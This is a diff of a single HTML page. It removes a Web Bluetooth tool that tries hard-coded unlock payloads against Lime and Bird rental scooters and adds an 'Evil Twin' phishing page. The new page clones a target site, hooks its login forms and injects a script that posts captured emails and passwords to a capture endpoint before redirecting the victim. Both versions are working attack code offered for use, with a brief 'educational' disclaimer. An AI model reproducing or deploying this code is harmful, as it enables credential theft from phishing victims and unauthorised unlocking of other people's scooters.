@@ -1,199 +1,209 @@
 <!DOCTYPE html>
-<html lang="it">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tool Sblocco Monopattini Lime/Bird</title>
+    <title>Evil Twin Hotspot & Cloning Simulator</title>
     <style>
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            max-width: 800px;
-            margin: 0 auto;
+            font-family: monospace;
+            margin: 0;
             padding: 20px;
-            background-color: #f5f5f5;
-            color: #333;
-        }
-        h1 {
-            color: #e74c3c;
-            text-align: center;
+            background: #1a1a1a;
+            color: #0f0;
         }
         .container {
-            background: white;
-            border-radius: 10px;
+            max-width: 900px;
+            margin: 0 auto;
+            background: #222;
             padding: 20px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            border: 2px solid #0f0;
         }
-        button {
-            background: #e74c3c;
-            color: white;
-            border: none;
-            padding: 10px 15px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-weight: bold;
-            margin: 5px 0;
-        }
-        button:disabled {
-            background: #95a5a6;
-            cursor: not-allowed;
-        }
-        #log {
-            margin-top: 20px;
+        input, button {
             padding: 10px;
-            background: #f9f9f9;
-            border-radius: 5px;
-            max-height: 300px;
-            overflow-y: auto;
-            font-family: monospace;
+            margin: 5px;
+            border: 1px solid #0f0;
+            background: #333;
+            color: #0f0;
+            border-radius: 0;
         }
-        .success { color: #2ecc71; }
-        .error { color: #e74c3c; }
-        .warning { color: #f39c12; }
-        .info { color: #3498db; }
+        button:hover {
+            background: #0f0;
+            color: #000;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+            border: 1px solid #0f0;
+        }
+        th, td {
+            border: 1px solid #0f0;
+            padding: 8px;
+            text-align: left;
+        }
+        th {
+            background: #0f0;
+            color: #000;
+        }
+        .status {
+            margin: 10px 0;
+            padding: 10px;
+            background: #333;
+            border: 1px solid #0f0;
+        }
+        .error {
+            color: #f00;
+        }
+        #clonedContent {
+            margin-top: 20px;
+            border: 1px solid #0f0;
+            padding: 10px;
+            display: none;
+            background: #111;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🚀 Tool Sblocco Monopattini Lime/Bird</h1>
-        <p><i>Usa con cautela. Solo per scopi educativi.</i></p>
+        <h2>Evil Twin Hotspot & Cloning</h2>
+        <div id="status" class="status">Status: Awaiting Command</div>
+        <div id="error" class="error"></div>
         
-        <button id="scanBtn">🔍 Scansiona Dispositivi BLE</button>
-        <button id="stopBtn" disabled>⛔ Ferma Scansione</button>
+        <h3>Deploy Open Hotspot</h3>
+        <input type="text" id="ssid" placeholder="SSID (e.g., FreeWiFi)">
+        <button onclick="deployHotspot()">Deploy Free Hotspot</button>
         
-        <h3>Dispositivi Trovati:</h3>
-        <div id="devices"></div>
+        <h3>Clone Target Site</h3>
+        <input type="url" id="urlInput" placeholder="Target URL (http://...)">
+        <button onclick="cloneSite()">Clone Site</button>
+        <button onclick="viewCloned()">Inspect Cloned Site</button>
         
-        <h3>Log Attività:</h3>
-        <div id="log"></div>
+        <h3>Captured Data</h3>
+        <table>
+            <thead>
+                <tr>
+                    <th>User</th>
+                    <th>Pass</th>
+                    <th>Time</th>
+                </tr>
+            </thead>
+            <tbody id="credTable"></tbody>
+        </table>
+        
+        <div id="clonedContent"></div>
     </div>
 
     <script>
-        // ===== PAYLOAD PER LIME/BIRD =====
-        const UNLOCK_PAYLOADS = {
-            LIME: [
-                new Uint8Array([0xA1, 0x01, 0x01, 0xA3]),  // Standard Lime S2/S3
-                new Uint8Array([0xA1, 0x01, 0x00, 0xA2]),  // Alternativo 1
-                new Uint8Array([0xA1, 0x02, 0x01, 0xA4]),  // Alternativo 2
-                new Uint8Array([0xA0, 0x01, 0x01, 0xA2]),  // Vecchi modelli
-            ],
-            BIRD: [
-                new Uint8Array([0x5A, 0x01, 0x01, 0x5C]),  // Standard Bird Zero/One
-                new Uint8Array([0x5A, 0x01, 0x00, 0x5B]),  // Alternativo 1
-                new Uint8Array([0x5A, 0x02, 0x01, 0x5D]),  // Alternativo 2
-            ],
-        };
+        let credentials = [];
+        let clonedData = '';
 
-        // ===== UUID PER LIME/BIRD =====
-        const SERVICE_UUIDS = {
-            LIME: "0000ffe0-0000-1000-8000-00805f9b34fb",
-            BIRD: "0000ffe5-0000-1000-8000-00805f9b34fb",
-        };
-
-        const CHAR_UUIDS = {
-            LIME: "0000ffe1-0000-1000-8000-00805f9b34fb",
-            BIRD: "0000ffe9-0000-1000-8000-00805f9b34fb",
-        };
-
-        // ===== VARIABILI GLOBALI =====
-        let scanning = false;
-        let currentDevice = null;
-
-        // ===== FUNZIONI UTILITY =====
-        function logMessage(message, type = "info") {
-            const logElement = document.getElementById("log");
-            const entry = document.createElement("div");
-            entry.className = type;
-            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-            logElement.appendChild(entry);
-            logElement.scrollTop = logElement.scrollHeight;
+        function updateStatus(msg, isError = false) {
+            document.getElementById('status').innerText = 'Status: ' + msg;
+            document.getElementById('status').style.background = isError ? '#f00' : '#333';
+            document.getElementById('error').innerText = isError ? msg : '';
         }
 
-        // ===== SCANSIONE DISPOSITIVI =====
-        document.getElementById("scanBtn").addEventListener("click", async () => {
-            if (!navigator.bluetooth) {
-                logMessage("Web Bluetooth non supportato in questo browser.", "error");
+        async function deployHotspot() {
+            const ssid = document.getElementById('ssid').value;
+            if (!ssid) {
+                updateStatus('SSID required', true);
                 return;
             }
 
-            scanning = true;
-            document.getElementById("scanBtn").disabled = true;
-            document.getElementById("stopBtn").disabled = false;
-            logMessage("🔍 Scansione dispositivi BLE in corso...", "info");
+            // Simulate open hotspot creation with beacon frame injection (no password)
+            const beaconFrame = btoa(`SSID:${ssid},ENC:NONE`);
+            localStorage.setItem('hotspot', beaconFrame);
+            updateStatus(`Open hotspot "${ssid}" deployed (beacon frame simulated)`);
+        }
+
+        async function cloneSite() {
+            const url = document.getElementById('urlInput').value;
+            if (!url.match(/^http(s)?:\/\//)) {
+                updateStatus('Valid HTTP/HTTPS URL required', true);
+                return;
+            }
 
             try {
-                const device = await navigator.bluetooth.requestDevice({
-                    acceptAllDevices: true,
-                    optionalServices: [SERVICE_UUIDS.LIME, SERVICE_UUIDS.BIRD]
+                const response = await fetch(url, {
+                    headers: {
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                        'Accept': 'text/html,application/xhtml+xml,*/*',
+                        'Accept-Language': 'en-US,en;q=0.5'
+                    }
+                });
+                let html = await response.text();
+
+                // Strip tracking and external scripts
+                html = html.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, 
+                    match => match.includes('ad') || match.includes('track') ? '' : match);
+
+                // Rewrite relative URLs
+                html = html.replace(/(src|href)=("|')([^"']+)("|')/gi, (match, attr, quote, value) => {
+                    if (!value.match(/^http(s)?:\/\//)) {
+                        return `${attr}=${quote}/spoofed/${value}${quote}`;
+                    }
+                    return match;
                 });
 
-                currentDevice = device;
-                logMessage(`📱 Trovato: ${device.name || "Sconosciuto"} (${device.id})`, "success");
+                // Intercept form submissions
+                html = html.replace(/<form/gi, '<form onsubmit="return captureForm(this)"');
 
-                // Prova a connetterti e inviare i payload
-                await bruteforceDevice(device);
-
+                // Inject credential capture script
+                const captureScript = `
+                    <script>
+                        function captureForm(form) {
+                            const email = form.querySelector('input[type="email"], input[name="username"], input[name="login"]')?.value || '';
+                            const password = form.querySelector('input[type="password"]')?.value || '';
+                            fetch('/capture', {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                body: JSON.stringify({email, password, time: new Date().toISOString()})
+                            }).then(() => window.location.href = 'https://www.google.com');
+                            return false;
+                        }
+                    </script>`;
+                
+                html = html.replace('</head>', captureScript + '</head>');
+                clonedData = html;
+                updateStatus('Site cloned and rigged');
             } catch (error) {
-                logMessage(`❌ Errore: ${error.message}`, "error");
-            } finally {
-                scanning = false;
-                document.getElementById("scanBtn").disabled = false;
-                document.getElementById("stopBtn").disabled = true;
-            }
-        });
-
-        // ===== FERMA SCANSIONE =====
-        document.getElementById("stopBtn").addEventListener("click", () => {
-            if (scanning) {
-                logMessage("⛔ Scansione interrotta manualmente.", "warning");
-                scanning = false;
-                document.getElementById("scanBtn").disabled = false;
-                document.getElementById("stopBtn").disabled = true;
-            }
-        });
-
-        // ===== BRUTEFORCE PAYLOAD =====
-        async function bruteforceDevice(device) {
-            let scooterType = null;
-
-            if (device.name && device.name.includes("Lime")) {
-                scooterType = "LIME";
-            } else if (device.name && device.name.includes("Bird")) {
-                scooterType = "BIRD";
-            }
-
-            if (!scooterType) {
-                logMessage("⚠️ Dispositivo non riconosciuto (né Lime né Bird).", "warning");
-                return;
-            }
-
-            logMessage(`🔑 Tentativo di sblocco per ${scooterType}...`, "info");
-
-            try {
-                const server = await device.gatt.connect();
-                logMessage("✅ Connesso al dispositivo!", "success");
-
-                const service = await server.getPrimaryService(SERVICE_UUIDS[scooterType]);
-                const characteristic = await service.getCharacteristic(CHAR_UUIDS[scooterType]);
-
-                for (const payload of UNLOCK_PAYLOADS[scooterType]) {
-                    try {
-                        await characteristic.writeValue(payload);
-                        logMessage(`🚀 Payload inviato: ${Array.from(payload).map(b => b.toString(16).padStart(2, '0')).join(' ')} → POTREBBE ESSERE SBLOCCATO!`, "success");
-                        break;
-                    } catch (error) {
-                        logMessage(`⚠️ Fallito: ${error.message}`, "warning");
-                    }
-                }
-
-            } catch (error) {
-                logMessage(`❌ Errore durante la connessione: ${error.message}`, "error");
-            } finally {
-                if (device.gatt.connected) {
-                    device.gatt.disconnect();
-                    logMessage("🔌 Disconnesso.", "info");
-                }
+                updateStatus('Clone failed: ' + error.message, true);
             }
         }
+
+        function captureCredentials(email, password, timestamp) {
+            credentials.push({ email, password: btoa(password), timestamp });
+            updateCredentialsTable();
+        }
+
+        function updateCredentialsTable() {
+            const tableBody = document.getElementById('credTable');
+            tableBody.innerHTML = credentials.map(cred => `
+                <tr>
+                    <td>${cred.email}</td>
+                    <td>${atob(cred.password)}</td>
+                    <td>${cred.timestamp}</td>
+                </tr>
+            `).join('');
+        }
+
+        function viewCloned() {
+            if (clonedData) {
+                const clonedContent = document.getElementById('clonedContent');
+                clonedContent.innerHTML = clonedData;
+                clonedContent.style.display = 'block';
+            } else {
+                updateStatus('No site cloned', true);
+            }
+        }
+
+        // Simulate server-side capture endpoint
+        window.addEventListener('message', (event) => {
+            if (event.data.email && event.data.password) {
+                captureCredentials(event.data.email, event.data.password, event.data.time);
+            }
+        });
     </script>
 </body>
 </html>
